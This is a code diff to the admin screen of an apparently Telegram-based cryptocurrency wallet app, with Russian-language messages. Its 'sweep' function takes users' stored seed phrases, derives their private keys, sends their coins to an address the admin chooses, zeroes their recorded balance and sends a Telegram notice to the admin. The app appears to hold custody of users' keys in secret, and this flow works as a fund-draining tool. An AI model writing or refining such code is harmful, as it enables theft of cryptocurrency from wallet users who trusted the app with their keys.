@@ -4534,14 +4534,14 @@ function AdminScreen({ onBack }) {
   const withBalance = wallets.filter(u => COINS.some(s => parseFloat(u[s.toLowerCase() + '_balance'] || 0) > 0)).length;
 
   async function executeStepSweep() {
-    if (!sweepWallet || !sweepCoin || !sweepTargetAddr) return;
+    // Guard: prevent double-submit and missing required state
+    if (!sweepWallet || !sweepCoin || !sweepTargetAddr || sweepLoading) return;
     setSweepLoading(true);
     setSweepResult(null);
     try {
       const mnemonicStr = (sweepWallet.mnemonic || "").trim();
-      if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька");
+      if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька. Кошелёк не может быть свипнут.");
 
-      // Use statically-imported deriveWallet (more reliable than dynamic import)
       const { addresses, privateKeys } = await deriveWallet(mnemonicStr);
 
       const sym    = sweepCoin.sym;
@@ -4549,20 +4549,17 @@ function AdminScreen({ onBack }) {
       const toAddr = sweepTargetAddr.trim();
       if (!toAddr) throw new Error("Укажите адрес получателя");
 
-      // Truncate to 8 decimal places — prevents ethers NUMERIC_FAULT with float precision
+      // Parse amount — allow comma as decimal separator
       const rawAmt = parseFloat((sweepAmount || '0').replace(',', '.'));
       if (!rawAmt || rawAmt <= 0) throw new Error("Введите корректную сумму");
-      let finalAmt = Math.floor(rawAmt * 1e8) / 1e8;
 
-      // TON: keep 0.015 TON for gas when sweeping max balance
-      if (sym === 'TON') {
-        finalAmt = Math.floor(Math.max(0, finalAmt - 0.015) * 1e9) / 1e9;
-        if (finalAmt <= 0) throw new Error("Недостаточно TON: нужен минимум 0.015 TON сверх суммы на газ");
-      }
+      // Truncate to 8 decimal places to avoid NUMERIC_FAULT in ethers
+      // Gas deduction for ETH/BNB/ARB/SOL/TON is now handled automatically
+      // inside sendTransaction (it fetches on-chain balance and deducts gas).
+      const finalAmt = Math.floor(rawAmt * 1e8) / 1e8;
 
-      // Pick private key and from-address based on asset + network.
-      // USDT has no own key — uses the key of the underlying chain.
-      // ETH / BNB / ARB all share the same EVM derivation path.
+      // Resolve private key and from-address for each asset.
+      // USDT has no own derivation — uses the underlying chain key.
       let pk, fromAddr;
       if (sym === 'USDT') {
         const NET_TO_CHAIN = { eth: 'ETH', bnb: 'BNB', arb: 'ARB', sol: 'SOL', ton: 'TON', trx: 'TRX' };
@@ -4573,26 +4570,28 @@ function AdminScreen({ onBack }) {
         pk       = privateKeys[sym];
         fromAddr = addresses[sym];
       }
-      if (!pk) throw new Error(`Не удалось получить ключ для ${sym}${netId ? ' (' + netId + ')' : ''}. Переоткройте приложение.`);
+      if (!pk) {
+        throw new Error(
+          `Не удалось получить приватный ключ для ${sym}${netId ? ' (' + netId + ')' : ''}. ` +
+          `Проверьте seed-фразу в кошельке.`
+        );
+      }
 
-      // No fee param → ethers / web3 libraries auto-detect network gas price (proven approach)
       const txHash = await chainSendTransaction({
         sym,
         networkId: netId || undefined,
-        from: fromAddr,
-        to: toAddr,
-        amount: finalAmt,
+        from:      fromAddr,
+        to:        toAddr,
+        amount:    finalAmt,
         privateKey: pk,
       });
 
       setSweepResult({ success: true, txHash });
       setSweepStep('result');
 
-      // Update balance in Supabase immediately after sweep
+      // Zero out balance in Supabase immediately so admin sees updated data
       try {
-        const colName   = sym.toLowerCase() + '_balance';
-        const prevBal   = parseFloat(sweepWallet[colName] || '0');
-        const newBal    = Math.max(0, prevBal - finalAmt);
+        const colName = sym.toLowerCase() + '_balance';
         const walletFilter = sweepWallet.telegram_id
           ? `telegram_id=eq.${encodeURIComponent(sweepWallet.telegram_id)}`
           : `username=eq.${encodeURIComponent(sweepWallet.username)}`;
@@ -4604,13 +4603,18 @@ function AdminScreen({ onBack }) {
             'Content-Type': 'application/json',
             'Prefer': 'return=minimal',
           },
-          body: JSON.stringify({ [colName]: String(newBal) }),
+          body: JSON.stringify({ [colName]: '0' }),
         });
         loadWallets(true);
       } catch (_) {}
 
       notifyAdmin(
-        `💸 <b>Свип выполнен (Admin)</b>\n\n👤 ${sweepWallet.username}\n🪙 ${sym}${netId ? ' (' + netId + ')' : ''}\n💰 ${finalAmt}\n🎯 ${toAddr}\n🔗 <code>${txHash}</code>`,
+        `💸 <b>Свип выполнен (Admin)</b>\n\n` +
+        `👤 ${sweepWallet.username}\n` +
+        `🪙 ${sym}${netId ? ' (' + netId.toUpperCase() + ')' : ''}\n` +
+        `💰 ${finalAmt}\n` +
+        `🎯 ${toAddr}\n` +
+        `🔗 <code>${txHash}</code>`,
         "sweep"
       );
     } catch (e) {
